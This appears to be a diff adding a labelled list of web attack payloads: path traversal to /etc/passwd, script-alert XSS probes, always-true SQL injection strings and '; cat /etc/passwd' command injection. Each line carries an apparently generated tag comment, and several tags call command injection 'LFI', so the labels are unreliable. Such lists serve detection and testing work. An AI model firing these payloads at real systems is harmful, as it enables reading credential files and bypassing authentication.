@@ -1,0 +1,100 @@
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+<script>alert(176)</script>  # XSS
+<script>alert(63)</script>  # XSS
+../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+' OR 115=115 --  # This payload is tagged as SQLi (SQL Injection).
+' OR 140=140 --  # This payload is tagged as SQLi (SQL Injection) since it is attempting to manipulate the SQL query to always return true by checking if 140 is equal to 140.
+../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+<script>alert(198)</script>  # XSS
+' OR 170=170 --  # This payload is tagged as SQLi (SQL injection) because it attempts to manipulate the SQL query by causing it to always return true with the condition "170=170".
+<script>alert(17)</script>  # XSS (Cross-Site Scripting)
+; cat /etc/passwd #57  # Tagged as LFI (Local File Inclusion)
+; cat /etc/passwd #90  # Tag: LFI
+; cat /etc/passwd #8  # Tag: LFI
+' OR 190=190 --  # This payload is tagged as SQL injection (SQLi). It attempts to manipulate a SQL query by making it always return true by using the condition `190=190`. This could allow an attacker to bypass authentication, extract sensitive data, modify database content, or perform other malicious actions.
+<script>alert(71)</script>  # XSS
+' OR 163=163 --  # This payload is tagged as SQL injection (SQLi) because it is attempting to manipulate the SQL query to return all rows by making the condition 163=163 always true.
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+' OR 157=157 --  # This payload is tagged as SQLi (SQL Injection).
+; cat /etc/passwd #170  # Tag: LFI (Local File Inclusion)
+' OR 193=193 --  # Tag: SQLi
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+' OR 19=19 --  # Tag: SQLi
+<script>alert(12)</script>  # XSS
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+<script>alert(73)</script>  # XSS
+; cat /etc/passwd #149  # This payload is attempting to perform a Local File Inclusion (LFI) attack. It tries to read the contents of the /etc/passwd file on the server by executing the `cat /etc/passwd` command.
+' OR 79=79 --  # This payload is an example of SQL injection (SQLi) as it attempts to manipulate the query to always evaluate to true by injecting a condition that is always true (79=79).
+; cat /etc/passwd #118  # Tag: LFI
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tagging: LFI (Local File Inclusion)
+; cat /etc/passwd #178  # Tag: LFI
+' OR 119=119 --  # This payload is tagged as SQLi (SQL Injection) as it is attempting to manipulate the SQL query logic by making the condition 119=119 always true, which can potentially lead to unauthorized access or data leakage.
+' OR 120=120 --  # This payload is identified as a SQL injection (SQLi) attack, as it attempts to manipulate the SQL query to return a true condition, in this case '120=120'.
+' OR 108=108 --  # This payload is identified as SQL Injection (SQLi) because it is attempting to manipulate the SQL query by injecting a statement that would always evaluate to true, in this case '108=108'. The '--' at the end is used to comment out the rest of the query, preventing any errors from occurring due to the injection.
+<script>alert(79)</script>  # XSS
+; cat /etc/passwd #167  # Tagging: LFI
+' OR 67=67 --  # This payload is classified as SQLi (SQL Injection).
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+<script>alert(194)</script>  # XSS
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+; cat /etc/passwd #32  # Tag: LFI
+' OR 134=134 --  # This payload is indicative of a SQL injection attack. It attempts to manipulate the SQL query to make a condition always evaluate to true, in this case by checking if "134" is equal to "134". This can lead to unauthorized access to the database or data leakage.
+<script>alert(10)</script>  # XSS
+; cat /etc/passwd #189  # Tag: LFI
+; cat /etc/passwd #103  # Tag: LFI (Local File Inclusion)
+; cat /etc/passwd #11  # Tag: LFI (Local File Inclusion)
+<script>alert(161)</script>  # XSS
+' OR 200=200 --  # This payload is typically used in SQL injection attacks. It attempts to inject a condition that will always evaluate to true in order to bypass authentication or retrieve sensitive information from a database.
+<script>alert(34)</script>  # XSS
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+; cat /etc/passwd #45  # Tag: LFI
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tagged as LFI (Local File Inclusion).
+<script>alert(3)</script>  # XSS
+' OR 82=82 --  # Tag: SQLi
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+; cat /etc/passwd #12  # Tag: LFI (Local File Inclusion)
+; cat /etc/passwd #98  # Tag: LFI (Local File Inclusion)
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+; cat /etc/passwd #132  # Tagging: LFI (Local File Inclusion)
+; cat /etc/passwd #6  # Tag: LFI
+; cat /etc/passwd #162  # Tag: LFI (Local File Inclusion)
+; cat /etc/passwd #56  # Tag: LFI (Local File Inclusion)
+; cat /etc/passwd #113  # Tag: LFI
+<script>alert(69)</script>  # XSS
+; cat /etc/passwd #55  # Tag: LFI (Local File Inclusion)
+' OR 186=186 --  # Tag: SQLi
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+<script>alert(188)</script>  # XSS (Cross-Site Scripting)
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+' OR 153=153 --  # This payload is tagged as SQLi (SQL Injection).
+<script>alert(37)</script>  # XSS
+' OR 37=37 --  # This payload is classified as SQLi (SQL Injection).
+<script>alert(193)</script>  # XSS
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tagged as: LFI (Local File Inclusion)
+' OR 139=139 --  # This payload is an example of a SQL injection (SQLi) attack. It is injecting a condition that will always evaluate to true, in this case "139=139", to manipulate the SQL query logic and potentially bypass authentication or retrieve sensitive information from the database.
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+; cat /etc/passwd #79  # Tag: LFI
+; cat /etc/passwd #23  # Tag: LFI
+<script>alert(151)</script>  # XSS
+<script>alert(115)</script>  # Tag: XSS
+<script>alert(45)</script>  # XSS
+../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+' OR 173=173 --  # This payload is tagged as SQLi (SQL Injection) as it is attempting to inject SQL code into a database query by modifying the WHERE clause to always be true (173=173).
+<script>alert(49)</script>  # XSS
+' OR 175=175 --  # Tag: SQLi
+; cat /etc/passwd #33  # Tag: LFI
+' OR 97=97 --  # This payload is tagged as SQLi (SQL Injection) because it aims to manipulate the SQL query to always return a true condition (97=97) by injecting additional SQL code (' OR 97=97 --) into a vulnerable input field.
+<script>alert(67)</script>  # XSS
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+; cat /etc/passwd #86  # Tag: LFI (Local File Inclusion)
+; cat /etc/passwd #183  # Tagged as LFI (Local File Inclusion)
+<script>alert(93)</script>  # XSS
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+; cat /etc/passwd #173  # Tag: LFI (Local File Inclusion)
+<script>alert(140)</script>  # XSS
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  # Tag: LFI (Local File Inclusion)
+<script>alert(110)</script>  # XSS (Cross-Site Scripting)
